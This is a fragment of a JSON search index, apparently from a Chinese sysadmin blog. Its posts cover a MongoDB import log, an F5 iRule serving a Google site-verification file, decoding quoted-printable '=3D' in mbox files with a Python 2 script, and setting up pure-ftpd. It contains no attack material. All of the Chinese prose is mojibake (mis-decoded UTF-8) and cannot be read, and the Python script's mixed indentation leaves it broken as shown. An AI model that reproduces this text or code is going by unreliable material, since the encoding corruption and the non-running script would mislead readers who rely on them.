class=\"m\"\u003e28\u003c/span\u003e 09:51:24.007             \u003cspan class=\"m\"\u003e796900\u003c/span\u003e  19922/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:27.001         Progress: 459658299/470754183   97%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:27.001             \u003cspan class=\"m\"\u003e857300\u003c/span\u003e  19937/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:27.793 check \u003cspan class=\"m\"\u003e9\u003c/span\u003e \u003cspan class=\"m\"\u003e878853\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:27.979 imported \u003cspan class=\"m\"\u003e878852\u003c/span\u003e objects  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿›å…¥å‘½ä»¤è¡Œï¼Œçœ‹çœ‹åº“çš„æ•´ä½“æƒ…å†µï¼š\u003c/p\u003e","title":"flask/pythonå¯¹mongodbçš„ä¸€äº›æ“ä½œ"},{"content":"å…¬å¸çš„ç½‘ç«™è¦è¿‡googleè®¤è¯ï¼Œéœ€è¦åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹æ”¾ä¸€ä¸ªæ–‡ä»¶ï¼Œgoogleb1e6d9a50ea8xxxx.html\nå†…å®¹å¦‚ä¸‹ï¼š\ngoogle-site-verification: googleb1e6d9a50ea8xxxx.html è¿™ä¸ªæ— æ¯”ç®€å•ï¼Œæ€ä¹ˆåˆè·ŸF5å’Œiruleæ‰¯ä¸Šå…³ç³»äº†å‘¢ï¼Ÿï¼\nå“ï¼Œå› ä¸ºå±…ç„¶è¦åšä¸¤ä¸ªåŸŸåï¼Œm.xxx.comå’Œh.xxx.comï¼Œè¿™ä¸¤ä¸ªåŸŸåéƒ½è¦è¿‡è®¤è¯ï¼Œè€Œä¸”æ‚²å‰§çš„æ˜¯ï¼Œè¿™ä¸¤ä¸ªåŸŸåå®é™…ä»£ç†çš„æ˜¯åŒä¸€å°åç«¯æœåŠ¡å™¨çš„åŒä¸€ä¸ªtomcatè¿›ç¨‹ã€‚\né‰´äºè¿™ä¸ªä¸œè¥¿è¿™ä¹ˆç®€å•ï¼Œå¹²è„†åœ¨F5ä¸Šæ¥ä¸€æ®µiruleè§£å†³é—®é¢˜ï¼š\nwhen HTTP_REQUEST { if { ([string tolower [HTTP::path]] starts_with \u0026#34;/googleb1e6d9a50ea8xxxx.html\u0026#34;) \u0026amp;\u0026amp; ([string tolower [HTTP::host]] equals \u0026#34;m.xxx.com\u0026#34;) } { HTTP::respond 200 content \u0026#34;google-site-verification: googleb1e6d9a50ea8xxxx.html\u0026#34; } } ç”±äºæ²¡æœ‰å¤ç”¨ipï¼Œæ‰€ä»¥åœ¨h.xxx.comåŒæ ·ä¿®æ”¹ä»¥ä¸Šè„šæœ¬å¹¶åº”ç”¨å³å¯ã€‚\nå¦‚æœæ˜¯ç©·å…‰è›‹ä½œé£ï¼Œåœ¨F5ä¸Šå¤ç”¨äº†IPåšäº†è™šæ‹Ÿä¸»æœºè½¬å‘ï¼Œä¹Ÿä¿®æ”¹ä¿®æ”¹è„šæœ¬å³å¯ã€‚\n","permalink":"https://rendoumi.com/posts/20240118-f5_irule/","summary":"\u003cp\u003eå…¬å¸çš„ç½‘ç«™è¦è¿‡googleè®¤è¯ï¼Œéœ€è¦åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹æ”¾ä¸€ä¸ªæ–‡ä»¶ï¼Œgoogleb1e6d9a50ea8xxxx.html\u003c/p\u003e\n\u003cp\u003eå†…å®¹å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egoogle-site-verification: googleb1e6d9a50ea8xxxx.html  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™ä¸ªæ— æ¯”ç®€å•ï¼Œæ€ä¹ˆåˆè·ŸF5å’Œiruleæ‰¯ä¸Šå…³ç³»äº†å‘¢ï¼Ÿï¼\u003c/p\u003e\n\u003cp\u003eå“ï¼Œå› ä¸ºå±…ç„¶è¦åšä¸¤ä¸ªåŸŸåï¼Œm.xxx.comå’Œh.xxx.comï¼Œè¿™ä¸¤ä¸ªåŸŸåéƒ½è¦è¿‡è®¤è¯ï¼Œè€Œä¸”æ‚²å‰§çš„æ˜¯ï¼Œè¿™ä¸¤ä¸ªåŸŸåå®é™…ä»£ç†çš„æ˜¯åŒä¸€å°åç«¯æœåŠ¡å™¨çš„åŒä¸€ä¸ªtomcatè¿›ç¨‹ã€‚\u003c/p\u003e\n\u003cp\u003eé‰´äºè¿™ä¸ªä¸œè¥¿è¿™ä¹ˆç®€å•ï¼Œå¹²è„†åœ¨F5ä¸Šæ¥ä¸€æ®µiruleè§£å†³é—®é¢˜ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewhen HTTP_REQUEST \u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"o\"\u003e([\u003c/span\u003estring tolower \u003cspan class=\"o\"\u003e[\u003c/span\u003eHTTP::path\u003cspan class=\"o\"\u003e]]\u003c/span\u003e starts_with \u003cspan class=\"s2\"\u003e\u0026#34;/googleb1e6d9a50ea8xxxx.html\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"o\"\u003e([\u003c/span\u003estring tolower \u003cspan class=\"o\"\u003e[\u003c/span\u003eHTTP::host\u003cspan class=\"o\"\u003e]]\u003c/span\u003e equals \u003cspan class=\"s2\"\u003e\u0026#34;m.xxx.com\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  HTTP::respond \u003cspan class=\"m\"\u003e200\u003c/span\u003e content \u003cspan class=\"s2\"\u003e\u0026#34;google-site-verification: googleb1e6d9a50ea8xxxx.html\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç”±äºæ²¡æœ‰å¤ç”¨ipï¼Œæ‰€ä»¥åœ¨h.xxx.comåŒæ ·ä¿®æ”¹ä»¥ä¸Šè„šæœ¬å¹¶åº”ç”¨å³å¯ã€‚\u003c/p\u003e\n\u003cp\u003eå¦‚æœæ˜¯ç©·å…‰è›‹ä½œé£ï¼Œåœ¨F5ä¸Šå¤ç”¨äº†IPåšäº†è™šæ‹Ÿä¸»æœºè½¬å‘ï¼Œä¹Ÿä¿®æ”¹ä¿®æ”¹è„šæœ¬å³å¯ã€‚\u003c/p\u003e","title":"F5 iruleä¹‹googleç«™é•¿è®¤è¯åˆ«æ ·ç”¨æ³•"},{"content":"æœ€è¿‘åœ¨æé‚®å±€ã€‚æœ‰ä¸ªå¾ˆå¥‡æ€ªçš„é—®é¢˜ï¼Œå°±æ˜¯æ‰“å¼€mboxçš„æ–‡ä»¶ï¼Œæ¯”å¦‚è¯´ï¼š\n/var/spool/mail/root\né‡Œé¢ä¿¡ä»¶çš„éƒ¨åˆ†æœ‰å¥‡æ€ªçš„3Då­—ç¬¦ï¼š\n\u0026lt;table cellpadding=3D\u0026#34;0\u0026#34; cellspacing=3D\u0026#34;0\u0026#34; style=3D\u0026#34;text-align:le= ft;color:#454545;background-color:#fff;font-size:14px;border-radius:10px;pa= æ³¨æ„ï¼Œä¸­é—´å¤šäº†è‹¥å¹²ä¸ª3Dï¼Œæœ€åä¹Ÿå¤šäº†=å·\nè¿™æ˜¯ä»€ä¹ˆé¬¼å‘¢ï¼Ÿ\næœäº†ä¸€åœˆï¼ŒåŸæ¥è¿™æ˜¯quoted-printableç¼–è§£ç ï¼Œè·ŸBase64ç±»ä¼¼ï¼Œbase64å’Œquoted-printableè¿™ä¸¤ç§ç¼–ç éƒ½æ˜¯åœ¨ç”µå­é‚®ä»¶ä¸­å¸¸è§çš„ç¼–ç æ–¹å¼ã€‚\nåŸºæœ¬çŸ¥è¯†ï¼š\nå¦‚æœ=å·å‡ºç°åœ¨ä¸€è¡Œæœ€åï¼Œè¡¨ç¤ºæ¢è¡Œï¼Œé‚£ä¹ˆï¼š he= llo æ„æ€å°±æ˜¯è¿èµ·æ¥çš„hello å¦‚æœä¸­é—´å‡ºç°=3Dï¼Œé‚£å°±æ˜¯ä¸€ä¸ª=å·çš„æ„æ€ æ‰€ä»¥style=3D\u0026quot;text\u0026quot;æ„æ€å°±æ˜¯style=\u0026ldquo;text\u0026rdquo; è‹±æ–‡å­—ç¬¦é™¤äº†=ä»¥å¤–ä¸åšå¤„ç†ï¼Œå…¶ä»–å­—ç¬¦çš„ç¼–ç ä¸º=åŠ è¿™ä¸ªå­—ç¬¦çš„ä¸¤ä¸ªå­—èŠ‚çš„16è¿›åˆ¶æ•°ã€‚ å¼„æ˜ç™½äº†å§ã€‚\nç»™ä¸€æ®µå¤„ç†mboxçš„pythonç¨‹åºï¼Œå¯ä»¥ç”¨æ¥è¯»é‚®ä»¶ï¼š\n#!/usr/bin/env python # -*- coding: utf-8 -*- import mailbox import base64 import os import sys import email import quopri filename = \u0026#34;/var/spool/mail/zrr\u0026#34; mb = mailbox.mbox(filename) nmes = len(mb) for i in range(len(mb)): print \u0026#34;\\n\\n\\n\\n\\n\u0026#34; print \u0026#34;-------------------------------------------------------------------------------------------------\u0026#34; print \u0026#34;Email\u0026#34;, i print \u0026#34;-------------------------------------------------------------------------------------------------\u0026#34; mes = mb.get_message(i) em = email.message_from_string(mes.as_string()) subject = em.get(\u0026#39;Subject\u0026#39;) if subject.find(\u0026#39;=?\u0026#39;) != -1: ll = email.header.decode_header(subject) subject = \u0026#34;\u0026#34; for l in ll: subject = subject + l[0] em_from = em.get(\u0026#39;From\u0026#39;) if em_from.find(\u0026#39;=?\u0026#39;) != -1: ll = email.header.decode_header(em_from) em_from = \u0026#34;\u0026#34; for l in ll: em_from = em_from + l[0] print \u0026#34;From: %s - Subject: %s\u0026#34; %(em_from, subject) print \u0026#34;-------------------------------------------------------------------------------------------------\u0026#34; if mes.is_multipart(): for part in mes.get_payload(): print quopri.decodestring(part.get_payload()) else: print quopri.decodestring(mes.get_payload()) ","permalink":"https://rendoumi.com/posts/20240118-mbox_3d/","summary":"\u003cp\u003eæœ€è¿‘åœ¨æé‚®å±€ã€‚æœ‰ä¸ªå¾ˆå¥‡æ€ªçš„é—®é¢˜ï¼Œå°±æ˜¯æ‰“å¼€mboxçš„æ–‡ä»¶ï¼Œæ¯”å¦‚è¯´ï¼š\u003c/p\u003e\n\u003cp\u003e/var/spool/mail/root\u003c/p\u003e\n\u003cp\u003eé‡Œé¢ä¿¡ä»¶çš„éƒ¨åˆ†æœ‰å¥‡æ€ªçš„3Då­—ç¬¦ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;table \u003cspan class=\"nv\"\u003ecellpadding\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e3D\u003cspan class=\"s2\"\u003e\u0026#34;0\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003ecellspacing\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e3D\u003cspan class=\"s2\"\u003e\u0026#34;0\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003estyle\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e3D\u003cspan class=\"s2\"\u003e\u0026#34;text-align:le=  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eft;color:#454545;background-color:#fff;font-size:14px;border-radius:10px;pa=  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ï¼Œä¸­é—´å¤šäº†è‹¥å¹²ä¸ª3Dï¼Œæœ€åä¹Ÿå¤šäº†=å·\u003c/p\u003e\n\u003cp\u003eè¿™æ˜¯ä»€ä¹ˆé¬¼å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eæœäº†ä¸€åœˆï¼ŒåŸæ¥è¿™æ˜¯quoted-printableç¼–è§£ç ï¼Œè·ŸBase64ç±»ä¼¼ï¼Œbase64å’Œquoted-printableè¿™ä¸¤ç§ç¼–ç éƒ½æ˜¯åœ¨ç”µå­é‚®ä»¶ä¸­å¸¸è§çš„ç¼–ç æ–¹å¼ã€‚\u003c/p\u003e\n\u003cp\u003eåŸºæœ¬çŸ¥è¯†ï¼š\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eå¦‚æœ=å·å‡ºç°åœ¨ä¸€è¡Œæœ€åï¼Œè¡¨ç¤ºæ¢è¡Œï¼Œé‚£ä¹ˆï¼š\nhe=\nllo\næ„æ€å°±æ˜¯è¿èµ·æ¥çš„hello\u003c/li\u003e\n\u003cli\u003eå¦‚æœä¸­é—´å‡ºç°=3Dï¼Œé‚£å°±æ˜¯ä¸€ä¸ª=å·çš„æ„æ€\næ‰€ä»¥style=3D\u0026quot;text\u0026quot;æ„æ€å°±æ˜¯style=\u0026ldquo;text\u0026rdquo;\u003c/li\u003e\n\u003cli\u003eè‹±æ–‡å­—ç¬¦é™¤äº†=ä»¥å¤–ä¸åšå¤„ç†ï¼Œå…¶ä»–å­—ç¬¦çš„ç¼–ç ä¸º=åŠ è¿™ä¸ªå­—ç¬¦çš„ä¸¤ä¸ªå­—èŠ‚çš„16è¿›åˆ¶æ•°ã€‚\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eå¼„æ˜ç™½äº†å§ã€‚\u003c/p\u003e\n\u003cp\u003eç»™ä¸€æ®µå¤„ç†mboxçš„pythonç¨‹åºï¼Œå¯ä»¥ç”¨æ¥è¯»é‚®ä»¶ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/usr/bin/env python\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"c1\"\u003e# -*- coding: utf-8 -*-\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport mailbox  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport base64  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport os  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport sys  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport email\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport quopri\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003efilename\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/var/spool/mail/zrr\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003emb\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e mailbox.mbox\u003cspan class=\"o\"\u003e(\u003c/span\u003efilename\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003enmes\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e len\u003cspan class=\"o\"\u003e(\u003c/span\u003emb\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efor\u003c/span\u003e i in range\u003cspan class=\"o\"\u003e(\u003c/span\u003elen\u003cspan class=\"o\"\u003e(\u003c/span\u003emb\u003cspan class=\"o\"\u003e))\u003c/span\u003e:  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        print \u003cspan class=\"s2\"\u003e\u0026#34;\\n\\n\\n\\n\\n\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        print \u003cspan class=\"s2\"\u003e\u0026#34;-------------------------------------------------------------------------------------------------\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    print \u003cspan class=\"s2\"\u003e\u0026#34;Email\u0026#34;\u003c/span\u003e, i\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        print \u003cspan class=\"s2\"\u003e\u0026#34;-------------------------------------------------------------------------------------------------\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003emes\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e mb.get_message\u003cspan class=\"o\"\u003e(\u003c/span\u003ei\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eem\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e email.message_from_string\u003cspan class=\"o\"\u003e(\u003c/span\u003emes.as_string\u003cspan class=\"o\"\u003e())\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003esubject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e em.get\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Subject\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e subject.find\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;=?\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e !\u003cspan class=\"o\"\u003e=\u003c/span\u003e -1:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003ell\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e email.header.decode_header\u003cspan class=\"o\"\u003e(\u003c/span\u003esubject\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003esubject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003efor\u003c/span\u003e l in ll:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003esubject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e subject + l\u003cspan class=\"o\"\u003e[\u003c/span\u003e0\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eem_from\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e em.get\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;From\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e em_from.find\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;=?\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e !\u003cspan class=\"o\"\u003e=\u003c/span\u003e -1:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003ell\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e email.header.decode_header\u003cspan class=\"o\"\u003e(\u003c/span\u003eem_from\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eem_from\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003efor\u003c/span\u003e l in ll:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003eem_from\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e em_from + l\u003cspan class=\"o\"\u003e[\u003c/span\u003e0\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    print \u003cspan class=\"s2\"\u003e\u0026#34;From: %s - Subject: %s\u0026#34;\u003c/span\u003e %\u003cspan class=\"o\"\u003e(\u003c/span\u003eem_from, subject\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        print \u003cspan class=\"s2\"\u003e\u0026#34;-------------------------------------------------------------------------------------------------\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e mes.is_multipart\u003cspan class=\"o\"\u003e()\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003efor\u003c/span\u003e part in mes.get_payload\u003cspan class=\"o\"\u003e()\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                print  quopri.decodestring\u003cspan class=\"o\"\u003e(\u003c/span\u003epart.get_payload\u003cspan class=\"o\"\u003e())\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            print quopri.decodestring\u003cspan class=\"o\"\u003e(\u003c/span\u003emes.get_payload\u003cspan class=\"o\"\u003e())\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"mboxæ–‡ä»¶ä¸­çš„=3Dæ˜¯ä»€ä¹ˆé¬¼(quoted-printableç¼–ç )"},{"content":"ç”¨è¿‡proftpdå’Œvs-ftpdï¼Œproftpdæœ‰å·¨ææ€–çš„sftpç»†ç²’åº¦æ§åˆ¶ï¼Œç‰¹æ®Šåœºåˆéå¸¸å¥½ã€‚\nä½†æ˜¯æ€»è§‰å¾—éƒ½å¾ˆå¤æ‚ï¼Œæˆ‘ä»¬æ–‡ä»¶ç³»ç»Ÿçš„åº•å±‚æ˜¯GlusterFSï¼Œåœ¨ä¹‹ä¸Šå»ºç«‹è™šç”¨æˆ·ï¼Œç”¨proftpdå’Œvs-ftpdéƒ½æ„Ÿè§‰å¤æ‚ã€‚\næ‰€ä»¥ä¸€ç›´åœ¨æ‰¾ç®€å•çš„æ–¹æ³•ï¼Œæœ€åå‘ç°äº†pure-ftpdï¼Œå¾ˆç®€å•ï¼ï¼ï¼\né¦–å…ˆå»ºä¸€ä¸ªæ— ä»»ä½•ç™»é™†æƒçš„æ–°ç”¨æˆ·ï¼Œæ³¨æ„ï¼Œuidå¿…é¡»åœ¨500ä»¥ä¸Šï¼Œä¸èƒ½ç”¨ç³»ç»Ÿç¼ºçœçš„ç”¨æˆ·ftpï¼Œåé¢æ”¹pure-ftpd.confæ—¶ä¼šæœ‰è¯´æ˜ï¼š\nuseradd -u1000 -U -s/sbin/nologin -M ftpuser å®‰è£…pure-ftpd\nyum -y install pure-ftpd ä¿®æ”¹é…ç½®ï¼š\nvi /etc/pure-ftpd/pure-ftpd.conf ChrootEveryone yes AnonymousOnly no NoAnonymous yes PureDB /etc/pure-ftpd/pureftpd.pdb #PAMAuthentication yes UnixAuthentication yes #æ³¨æ„ï¼Œè¿™é‡Œå°±æŒ‡å‡ºäº†æœ€å°uidï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥å»ºç«‹ç”¨æˆ·çš„æ—¶å€™uidä¸èƒ½å°äº500ï¼Œå¦åˆ™pure-ftpdæ— æ³•è®¤è¯ MinUID 500 CreateHomeDir yes æ”¹å®Œåï¼Œæˆ‘ä»¬æ¥å¢åŠ 